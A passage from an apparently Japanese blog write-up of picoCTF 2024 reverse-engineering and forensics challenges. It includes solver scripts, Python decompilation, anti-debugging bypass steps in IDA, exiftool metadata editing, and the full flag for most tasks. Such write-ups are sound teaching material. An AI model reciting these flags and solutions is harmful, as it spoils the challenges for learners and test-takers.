&gt;&gt; <span class="number">4</span> &amp; _0xf) + ((<span class="type">int</span>)pass_in[j] - (<span class="type">int</span>)a_ch) + (_0xf &amp; local_2c);</span><br><span class="line">    pass_in[j] = a_ch + (<span class="type">char</span>)iVar1 + (<span class="type">char</span>)(iVar1 / <span class="number">0x1a</span>) * <span class="number">-0x1a</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">iVar1 = <span class="built_in">memcmp</span>(pass_in,&amp;pass_answer,(<span class="type">long</span>)_51);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>細かいところは抜きにして、大事な性質として、</p>
<ul>
<li>ユーザー入力は一文字ずつ処理している（前後の文字の影響を受けない）</li>
</ul>
<p>というのがある。</p>
<p>また、gdbで動的に実験すると、</p>
<table>
<thead>
<tr>
<th>ユーザー入力4文字 (password)</th>
<th>s1の先頭4文字 (s1)</th>
<th>s2の先頭4文字 (s2)</th>
</tr>
</thead>
<tbody><tr>
<td>aaaa</td>
<td>addg</td>
<td>lxpy</td>
</tr>
<tr>
<td>bbbb</td>
<td>beeh</td>
<td>lxpy</td>
</tr>
</tbody></table>
<p>ということもわかる。このことから、</p>
<ol>
<li>ユーザー入力を <code>aaa...a</code> (51文字) として得られた s1 と、</li>
<li>s2 の差を一文字ずつ調べて、</li>
<li>その差を ‘a’ をベースに足してやった文字が、その文字インデックスにおける正しいパスワード文字</li>
</ol>
<p>と推測できる。</p>
<p>以下のPythonコードで正解のパスワードを得る。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>s1 = <span class="string">&#x27;addgdggjdggjgjjmdggjgjjmgjjmjmmpdggjgjjmgjjmjmmpgj&#x27;</span> <span class="comment"># aaa..a と入力した結果のs1</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s2 = <span class="string">&#x27;lxpyrvmgduiprervmoqkvfqrblqpvqueeuzmpqgycirxthsjaw&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>password = [<span class="built_in">chr</span>(<span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>) + <span class="built_in">ord</span>(s2c) - <span class="built_in">ord</span>(s1c)) <span class="keyword">for</span> s1c, s2c <span class="keyword">in</span> <span class="built_in">zip</span>(s1, s2)]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(password))</span><br><span class="line">lumsopg^aocgl\ijjikbp]hf\chdmeiVbotdjh^m]`ilk\g[[n</span><br></pre></td></tr></table></figure>

<p>これをncで繋いだサーバーに送ると、フラグをゲット。</p>
<aside style="padding: 10px; border-radius: 5px; border: 1px solid #eee; background-color: transparent; width: 800px;">
⛳ picoCTF{s0lv3_angry_symb0ls_150f8acd}

</aside>

<h3><span id="weirdsnake">weirdSnake</span></h3><img src="/img/2024/03-27/Untitled%2024.png" width="550px" height="auto"> 

<p>disモジュールによって .pyc をディスアセンブルしたテキストが添付されている。</p>
<p>猛者ならばこれを手で .py に復元できるのだろうが、嫌なので、ぐぐってでコンパイラを探す。</p>
<p><a target="_blank" rel="noopener" href="https://github.com/SuperStormer/pyasm/tree/master">GitHub - SuperStormer&#x2F;pyasm: Decompile dis.dis output.</a></p>
<p>これが一応使えそうだが、Kaliに入れていたPythonだと素直には動かない。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pyenv install <span class="number">3.8</span><span class="number">.18</span></span><br></pre></td></tr></table></figure>

<p>しつつ、エラーが出るので <code>~/.pyenv/versions/3.8.18/lib/python3.8/site-packages/pyasm/__init__.py</code> のファイルを以下のように力技で微修正。</p>
<figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">def instructions_to_code(</span><br><span class="line">        instructions, code_objects=None, version=None, name=&quot;main&quot;, filename=&quot;out.py&quot;, flags=0</span><br><span class="line">):</span><br><span class="line"><span class="addition">+        from xdis.opcodes import opcode_38</span></span><br><span class="line">...</span><br><span class="line"><span class="deletion">-        opcodes = op_imports[canonic_python_version[version]]</span></span><br><span class="line"><span class="addition">+        #opcodes = op_imports[canonic_python_version[version]]</span></span><br><span class="line"><span class="addition">+        opcodes = opcode_38</span></span><br></pre></td></tr></table></figure>

<p>その後</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">% ~/.pyenv/versions/3.8.18/bin/python -m pyasm snake.dis</span><br></pre></td></tr></table></figure>

<p>コマンドにより、以下のPythonコードが出力された。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    input_list = [</span><br><span class="line">     <span class="number">4</span>, <span class="number">54</span>, <span class="number">41</span>, <span class="number">0</span>, <span class="number">112</span>, <span class="number">32</span>, <span class="number">25</span>, <span class="number">49</span>, <span class="number">33</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">57</span>, <span class="number">32</span>, <span class="number">108</span>, <span class="number">23</span>, <span class="number">48</span>,</span><br><span class="line">     <span class="number">4</span>, <span class="number">9</span>, <span class="number">70</span>, <span class="number">7</span>, <span class="number">110</span>, <span class="number">36</span>, <span class="number">8</span>, <span class="number">108</span>, <span class="number">7</span>, <span class="number">49</span>, <span class="number">10</span>, <span class="number">4</span>, <span class="number">86</span>, <span class="number">43</span>, <span class="number">108</span>, <span class="number">122</span>,</span><br><span class="line">     <span class="number">14</span>, <span class="number">2</span>, <span class="number">71</span>, <span class="number">62</span>, <span class="number">115</span>, <span class="number">88</span>, <span class="number">78</span>]</span><br><span class="line">    key_str = <span class="string">&#x27;J&#x27;</span></span><br><span class="line">    key_str = <span class="string">&#x27;_&#x27;</span> + key_str</span><br><span class="line">    key_str = key_str + <span class="string">&#x27;o&#x27;</span></span><br><span class="line">    key_str = key_str + <span class="string">&#x27;3&#x27;</span></span><br><span class="line">    key_str = <span class="string">&#x27;t&#x27;</span> + key_str</span><br><span class="line">    key_list = [<span class="built_in">ord</span>(char) <span class="keyword">for</span> char <span class="keyword">in</span> key_str]</span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(key_list) &lt; <span class="built_in">len</span>(input_list):</span><br><span class="line">        key_list.extend(key_list)</span><br><span class="line"></span><br><span class="line">    result = [a ^ b <span class="keyword">for</span> a, b <span class="keyword">in</span> <span class="built_in">zip</span>(input_list, key_list)]</span><br><span class="line">    result_text = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="built_in">chr</span>, result))</span><br></pre></td></tr></table></figure>

<p>最後の result_text がフラグになっている。</p>
<aside style="padding: 10px; border-radius: 5px; border: 1px solid #eee; background-color: transparent; width: 800px;">
⛳ picoCTF{N0t_sO_coNfus1ng_sn@ke_30a13a97}

</aside>

<h3><span id="winantidbg0x100">WinAntiDbg0x100</span></h3><p>慣れないWindowsマシン引っ張り出して解いたのであんまりメモってない。</p>
<p>IDA Freeでステップ実行し、IsDebuggerPresent() みたいな関数の返り値 eax を書き換えて分岐先を変えた。</p>
<p>フラグもメモってない…</p>
<h3><span id="winantidbg0x200">WinAntiDbg0x200</span></h3><p>判定箇所が2箇所になったくらいで、あとは WinAntiDbg0x100 と同じ</p>
<p>（またフラグメモってない）</p>
<h3><span id="winantidbg0x300">WinAntiDbg0x300</span></h3><img src="/img/2024/03-27/Untitled%2025.png" width="550px" height="auto"> 

<p>解けた問題の中では一番苦労した…………….</p>
<p>解き方も（だいぶ肉薄していたとは思うが）完璧とは言えない感じなので、他の人のwriteupも見てみたい。</p>
<hr>
<p>まず、管理者モードのコマンドラインからexeを開く。そうするとGUIアプリが開く。デバッガ（IDA Freeを使った）から開くとアンチデバッガ機構にやられてすぐに終了するので注意（100敗）。</p>
<p>GUIのプロセスにデバッガをアタッチ。スレッドリストを確認。<br>WinAntiDbg0x300.exe のスレッドがアンチデバッグ機構を持っているっぽいので、こいつをSuspend。<br>3B123Fのスレッドがフラグ文字列をメモリ上で構築してくれてるっぽい（backtraceでWinAntiDbg0x300の命令を静的に観測して総判断した）ので、こいつ中心に動かしていく。</p>
<img src="/img/2024/03-27/Untitled%2026.png" width="550px" height="auto"> 

<p>アドレス 003B38DB の jmp 命令が、ヒントにある「infinite loop」な気がする（試行錯誤の結果）ので、EIPをその直後の 003B38E0 にセット。</p>
<img src="/img/2024/03-27/Untitled%2027.png" width="550px" height="auto"> 

<p>ここで WinAntiDbg0x300 のスレッドをSuspendからReadyに切り替え、Resumeする。例外のダイアログが出るが無視してResumeを続ける（例外はpass to appせずにdiscard）。。。。とかやった気がするが、何十回何百回と試行錯誤をしているうちにフラグが出た感じで、同再現すればよいのか正直わかってない…</p>
<img src="/img/2024/03-27/Untitled%2028.png" width="550px" height="auto"> 

<aside style="padding: 10px; border-radius: 5px; border: 1px solid #eee; background-color: transparent; width: 800px;">
⛳ picoCTF{Wind0ws_antid3bg_0x300_da7fdd01}

</aside>

<h2><span id="forensics">Forensics</span></h2><h3><span id="scan-surprise">Scan Surprise</span></h3><img src="/img/2024/03-27/Untitled%2029.png" width="550px" height="auto"> 

<p>なんかよくわからんけど、添付zipの中のpngのQRコード読んだだけでフラグ。</p>
<aside style="padding: 10px; border-radius: 5px; border: 1px solid #eee; background-color: transparent; width: 800px;">
⛳ picoCTF{p33k_@_b00_a81f0a35}

</aside>

<h3><span id="verify">Verify</span></h3><img src="/img/2024/03-27/Untitled%2030.png" width="550px" height="auto"> 

<p>sshして↓実行してフラグ。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ctf-player@pico-chall$ <span class="keyword">for</span> f in $(ls files/) ; <span class="keyword">do</span> bash decrypt.sh files/$f <span class="number">2</span>&gt;&amp;<span class="number">1</span> ; done |grep -v <span class="string">&#x27;bad magic&#x27;</span> |grep -v Error</span><br><span class="line">picoCTF&#123;trust_but_verify_00011a60&#125;</span><br></pre></td></tr></table></figure>

<aside style="padding: 10px; border-radius: 5px; border: 1px solid #eee; background-color: transparent; width: 800px;">
⛳ picoCTF{trust_but_verify_00011a60}

</aside>

<h3><span id="canyousee">CanYouSee</span></h3><img src="/img/2024/03-27/Untitled%2031.png" width="550px" height="auto"> 

<p>添付のzipを展開して出てきたjpgファイルをexiftoolで見て、フラグのBase64エンコード結果を得られる。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">% exiftool ukn_reality.jpg</span><br><span class="line">ExifTool Version Number         : 12.65</span><br><span class="line">File Name                       : ukn_reality.jpg</span><br><span class="line">Directory                       : .</span><br><span class="line">File Size                       : 2.3 MB</span><br><span class="line">File Modification Date/Time     : 2024:02:16 07:40:21+09:00</span><br><span class="line">File Access Date/Time           : 2024:02:16 07:40:21+09:00</span><br><span class="line">File Inode Change Date/Time     : 2024:03:13 16:24:30+09:00</span><br><span class="line">File Permissions                : -rw-r--r--</span><br><span class="line">File Type                       : JPEG</span><br><span class="line">File Type Extension             : jpg</span><br><span class="line">MIME Type                       : image/jpeg</span><br><span class="line">JFIF Version                    : 1.01</span><br><span class="line">Resolution Unit                 : inches</span><br><span class="line">X Resolution                    : 72</span><br><span class="line">Y Resolution                    : 72</span><br><span class="line">XMP Toolkit                     : Image::ExifTool 11.88</span><br><span class="line">Attribution URL                 : cGljb0NURntNRTc0RDQ3QV9ISUREM05fYTZkZjhkYjh9Cg==</span><br><span class="line">Image Width                     : 4308</span><br><span class="line">Image Height                    : 2875</span><br><span class="line">Encoding Process                : Baseline DCT, Huffman coding</span><br><span class="line">Bits Per Sample                 : 8</span><br><span class="line">Color Components                : 3</span><br><span class="line">Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)</span><br><span class="line">Image Size                      : 4308x2875</span><br><span class="line">Megapixels                      : 12.4</span><br><span class="line"></span><br><span class="line">% <span class="built_in">echo</span> <span class="string">&#x27;cGljb0NURntNRTc0RDQ3QV9ISUREM05fYTZkZjhkYjh9Cg==&#x27;</span> |<span class="built_in">base64</span> -d</span><br><span class="line">picoCTF&#123;ME74D47A_HIDD3N_a6df8db8&#125;</span><br></pre></td></tr></table></figure>

<aside style="padding: 10px; border-radius: 5px; border: 1px solid #eee; background-color: transparent; width: 800px;">
⛳ picoCTF{ME74D47A_HIDD3N_a6df8db8}

</aside>

<h3><span id="secret-of-the-polyglot">Secret of the Polyglot</span></h3><img src="/img/2024/03-27/Untitled%2032.png" width="550px" height="auto"> 

<p>とりあえずPDFとして普通に開いてみると、</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1n_pn9_&amp;_pdf_7f9bccd1&#125;</span><br></pre></td></tr></table></figure>

<p>の文字列が書かれている。</p>
<p>他方、fileコマンドで見てみるとマジックコードはPNGらしい。 .png にしてあげて適当なビュワーで見ると、フラグのprefixが画像に描かれている。</p>
<aside style="padding: 10px; border-radius: 5px; border: 1px solid #eee; background-color: transparent; width: 800px;">
⛳ picoCTF{f1u3n7_1n_pn9_&_pdf_7f9bccd1}

</aside>

<h3><span id="mob-psycho">Mob psycho</span></h3><img src="/img/2024/03-27/Untitled%2033.png" width="550px" height="auto"> 

<p>apkはzipフォーマットなので、展開してみる。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">% <span class="built_in">cp</span> mobpsycho.&#123;apk,zip&#125;</span><br><span class="line">% unzip mobpsycho.zip</span><br></pre></td></tr></table></figure>

<p>フラグっぽいファイルを探してみると、あった。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">% find . -name <span class="string">&#x27;flag*&#x27;</span></span><br><span class="line">./res/color/flag.txt</span><br><span class="line">% <span class="built_in">cat</span> ./res/color/flag.txt</span><br><span class="line">7069636f4354467b6178386d433052553676655f4e5838356c346178386d436c5f61336562356163327d</span><br></pre></td></tr></table></figure>

<p>CyberChefでhex decodeして、フラグゲット。</p>
<aside style="padding: 10px; border-radius: 5px; border: 1px solid #eee; background-color: transparent; width: 800px;">
⛳ picoCTF{ax8mC0RU6ve_NX85l4ax8mCl_a3eb5ac2}

</aside>

<h3><span id="endianness-v2">endianness-v2</span></h3><img src="/img/2024/03-27/Untitled%2034.png" width="550px" height="auto"> 

<p>32-bits systemからのファイルということで、4バイトごとに無茶苦茶にシャッフルしたエンディアンなのだろうと予想。</p>
<p>4! &#x3D; 24 通り全てのシャッフルを作ってファイル保存する。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">import itertools</span><br><span class="line">import struct</span><br><span class="line"></span><br><span class="line"><span class="comment">## ファイルをバイナリモードで開く</span></span><br><span class="line">with open(<span class="string">&quot;challengefile&quot;</span>, <span class="string">&quot;rb&quot;</span>) as f:</span><br><span class="line">    data = f.read()</span><br><span class="line"></span><br><span class="line"><span class="comment">## 4バイトずつ読み取る</span></span><br><span class="line">chunks = [data[i : i + 4] <span class="keyword">for</span> i <span class="keyword">in</span> range(0, len(data), 4)]</span><br><span class="line"></span><br><span class="line"><span class="comment">## すべての可能な組み合わせでシャッフルする</span></span><br><span class="line"><span class="keyword">for</span> i, permutation <span class="keyword">in</span> enumerate(itertools.permutations([0, 1, 2, 3])):</span><br><span class="line">    <span class="comment"># 新しいファイルを作成する</span></span><br><span class="line">    with open(f<span class="string">&quot;challengefile-&#123;i&#125;&quot;</span>, <span class="string">&quot;wb&quot;</span>) as f:</span><br><span class="line">        <span class="keyword">for</span> chunk <span class="keyword">in</span> chunks:</span><br><span class="line">            <span class="keyword">if</span> len(chunk) != 4:</span><br><span class="line">                <span class="comment"># ファイルの最後のチャンクが4バイト未満の場合、そのまま書き込む</span></span><br><span class="line">                f.write(chunk)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="comment"># バイトをシャッフルして書き込む</span></span><br><span class="line">                f.write(struct.pack(<span class="string">&quot;4B&quot;</span>, *(chunk[j] <span class="keyword">for</span> j <span class="keyword">in</span> permutation)))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>実行したあとで各ファイルを file コマンドで見てみる。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">% file *</span><br><span class="line">challengefile:        data</span><br><span class="line">challengefile-0:      data</span><br><span class="line">challengefile-1:      data</span><br><span class="line">challengefile-10:     data</span><br><span class="line">challengefile-11:     data</span><br><span class="line">challengefile-12:     data</span><br><span class="line">challengefile-13:     data</span><br><span class="line">challengefile-14:     data</span><br><span class="line">challengefile-15:     data</span><br><span class="line">challengefile-16:     data</span><br><span class="line">challengefile-17:     data</span><br><span class="line">challengefile-18:     data</span><br><span class="line">challengefile-19:     data</span><br><span class="line">challengefile-2:      data</span><br><span class="line">challengefile-20:     data</span><br><span class="line">challengefile-21:     data</span><br><span class="line">challengefile-22:     data</span><br><span class="line">challengefile-23:     JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, baseline, precision 8, 300x150, components 3</span><br><span class="line">challengefile-3:      data</span><br><span class="line">challengefile-4:      data</span><br><span class="line">challengefile-5:      data</span><br><span class="line">challengefile-6:      data</span><br><span class="line">challengefile-7:      data</span><br><span class="line">challengefile-8:      data</span><br><span class="line">challengefile-9:      JPEG image data</span><br><span class="line">solve.py:             Unicode text, UTF-8 text</span><br></pre></td></tr></table></figure>

<p>challengefile-23 と challengefile-9 がJPEGっぽい。challengefile-23 を .jpg ファイルとして適当なビュワーで開くとフラグ。</p>
<aside style="padding: 10px; border-radius: 5px; border: 1px solid #eee; background-color: transparent; width: 800px;">
⛳ picoCTF{cert!f1Ed_iNd!4n_s0rrY_3nDian_76e05f49}

</aside>

<h3><span id="blast-from-the-past">Blast from the past</span></h3><img src="/img/2024/03-27/Untitled%2035.png" width="550px" height="auto"> 

<p>主にexiftoolを使ってEXIFタグのタイムスタンプを書き換えていく問題。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cp</span> original.jpg 1.jpg</span><br><span class="line"></span><br><span class="line">exiftool -DateTimeOriginal=<span class="string">&#x27;1970:01:01 00:00:00&#x27;</span> 1.jpg</span><br><span class="line">exiftool -ModifyDate=<span class="string">&#x27;1970:01:01 00:00:00&#x27;</span> 1.jpg</span><br><span class="line">exiftool -CreateDate=<span class="string">&#x27;1970:01:01 00:00:00&#x27;</span> 1.jpg</span><br><span class="line">exiftool -SubSecCreateDate=<span class="string">&#x27;1970:01:01 00:00:00.001&#x27;</span> 1.jpg</span><br><span class="line">exiftool -SubSecDateTimeOriginal=<span class="string">&#x27;1970:01:01 00:00:00.001&#x27;</span> 1.jpg</span><br><span class="line">exiftool -SubSecModifyDate=<span class="string">&#x27;1970:01:01 00:00:00.001&#x27;</span> 1.jpg</span><br><span class="line"></span><br><span class="line">exiftool -TimeStamp=<span class="string">&#x27;1970:01:01 00:00:00.001+00:00&#x27;</span> 1.jpg</span><br></pre></td></tr></table></figure>

<p>この状態でチェックしてみる。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">% nc -q 2 mimas.picoctf.net 65054 &lt; 1.jpg</span><br><span class="line"></span><br><span class="line">% nc mimas.picoctf.net 64910</span><br><span class="line">MD5 of your picture:</span><br><span class="line">eb5ae92ce9f801b9d1aa8e4c800e9705  test.out</span><br><span class="line"></span><br><span class="line">Checking tag 1/7</span><br><span class="line">Looking at IFD0: ModifyDate</span><br><span class="line">Looking <span class="keyword">for</span> <span class="string">&#x27;1970:01:01 00:00:00&#x27;</span></span><br><span class="line">Found: 1970:01:01 00:00:00</span><br><span class="line">Great job, you got that one!</span><br><span class="line"></span><br><span class="line">Checking tag 2/7</span><br><span class="line">Looking at ExifIFD: DateTimeOriginal</span><br><span class="line">Looking <span class="keyword">for</span> <span class="string">&#x27;1970:01:01 00:00:00&#x27;</span></span><br><span class="line">Found: 1970:01:01 00:00:00</span><br><span class="line">Great job, you got that one!</span><br><span class="line"></span><br><span class="line">Checking tag 3/7</span><br><span class="line">Looking at ExifIFD: CreateDate</span><br><span class="line">Looking <span class="keyword">for</span> <span class="string">&#x27;1970:01:01 00:00:00&#x27;</span></span><br><span class="line">Found: 1970:01:01 00:00:00</span><br><span class="line">Great job, you got that one!</span><br><span class="line"></span><br><span class="line">Checking tag 4/7</span><br><span class="line">Looking at Composite: SubSecCreateDate</span><br><span class="line">Looking <span class="keyword">for</span> <span class="string">&#x27;1970:01:01 00:00:00.001&#x27;</span></span><br><span class="line">Found: 1970:01:01 00:00:00.001</span><br><span class="line">Great job, you got that one!</span><br><span class="line"></span><br><span class="line">Checking tag 5/7</span><br><span class="line">Looking at Composite: SubSecDateTimeOriginal</span><br><span class="line">Looking <span class="keyword">for</span> <span class="string">&#x27;1970:01:01 00:00:00.001&#x27;</span></span><br><span class="line">Found: 1970:01:01 00:00:00.001</span><br><span class="line">Great job, you got that one!</span><br><span class="line"></span><br><span class="line">Checking tag 6/7</span><br><span class="line">Looking at Composite: SubSecModifyDate</span><br><span class="line">Looking <span class="keyword">for</span> <span class="string">&#x27;1970:01:01 00:00:00.001&#x27;</span></span><br><span class="line">Found: 1970:01:01 00:00:00.001</span><br><span class="line">Great job, you got that one!</span><br><span class="line"></span><br><span class="line">Checking tag 7/7</span><br><span class="line">Timezones <span class="keyword">do</span> not have to match, as long as it<span class="string">&#x27;s the equivalent time.</span></span><br><span class="line"><span class="string">Looking at Samsung: TimeStamp</span></span><br><span class="line"><span class="string">Looking for &#x27;</span>1970:01:01 00:00:00.001+00:00<span class="string">&#x27;</span></span><br><span class="line"><span class="string">Found: 2023:11:20 20:46:21.420+00:00</span></span><br><span class="line"><span class="string">Oops! That tag isn&#x27;</span>t right. Please try again.</span><br></pre></td></tr></table></figure>

<p>7番目のチェックに失敗するが、 <code>Samsung: TimeStamp</code> というタグは素直には編集させてもらえない。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">% exiftool -TimeStamp=<span class="string">&#x27;1970:01:01 00:00:00.001&#x27;</span> 1.jpg</span><br><span class="line">Warning: Not an <span class="built_in">integer</span> <span class="keyword">for</span> XMP-apple-fi:TimeStamp</span><br><span class="line">    0 image files updated</span><br><span class="line">    1 image files unchanged</span><br></pre></td></tr></table></figure>

<p>どうやらこのタイムスタンプは、オフセット 0x2b82ae から始まるSamusungの拡張領域？に書いてあるよう。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">% exiftool -v 1.jpg</span><br><span class="line">...</span><br><span class="line">Samsung trailer (143 bytes at offset 0x2b82ae):</span><br><span class="line">  SamsungTrailer_0x0a01Name = Image_UTC_Data</span><br><span class="line">  TimeStamp = 1700513181420</span><br><span class="line">  SamsungTrailer_0x0aa1Name = MCC_Data</span><br><span class="line">  MCCData = 310</span><br><span class="line">  SamsungTrailer_0x0c61Name = Camera_Capture_Mode_Info</span><br><span class="line">  SamsungTrailer_0x0c61 = 1</span><br></pre></td></tr></table></figure>

<p>バイナリエディタで開いてみる。</p>
<img src="/img/2024/03-27/Untitled%2036.png" width="550px" height="auto"> 

<p>タイムスタンプは <code>UTC_Data1700513181420</code> という形式で入っている。</p>
<p>ここを試行錯誤しながら編集すると、 <code>UTC_Data0000000000001</code> で所望の <code>1970:01:01 00:00:00.001+00:00</code> になる。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">% nc -q 2 mimas.picoctf.net 53963 &lt; 1.jpg</span><br><span class="line"></span><br><span class="line">% nc  mimas.picoctf.net 63469</span><br><span class="line">MD5 of your picture:</span><br><span class="line">412331ca77b633d2529dc0e0ab5ad6eb  test.out</span><br><span class="line"></span><br><span class="line">Checking tag 1/7</span><br><span class="line">Looking at IFD0: ModifyDate</span><br><span class="line">Looking <span class="keyword">for</span> <span class="string">&#x27;1970:01:01 00:00:00&#x27;</span></span><br><span class="line">Found: 1970:01:01 00:00:00</span><br><span class="line">Great job, you got that one!</span><br><span class="line"></span><br><span class="line">Checking tag 2/7</span><br><span class="line">Looking at ExifIFD: DateTimeOriginal</span><br><span class="line">Looking <span class="keyword">for</span> <span class="string">&#x27;1970:01:01 00:00:00&#x27;</span></span><br><span class="line">Found: 1970:01:01 00:00:00</span><br><span 